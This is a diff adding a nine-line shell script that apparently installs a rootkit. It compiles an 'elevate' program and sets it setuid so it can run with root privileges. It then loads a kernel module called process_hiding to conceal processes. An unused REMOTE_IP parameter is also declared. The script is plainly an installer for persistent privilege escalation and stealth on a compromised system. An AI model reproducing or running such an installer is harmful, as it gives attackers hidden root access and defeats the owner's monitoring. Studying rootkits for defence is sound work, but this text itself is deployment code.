@@ -1,0 +1,9 @@
+#!/bin/sh
+REMOTE_IP=$1
+set -e
+cc -o elevate src/elevate/elevate.c
+chmod 4111 elevate
+echo "elevate compiled"
+kldload -v src/process_hiding/process_hiding.ko
+echo "Process hiding created and hidden"
+exit 0
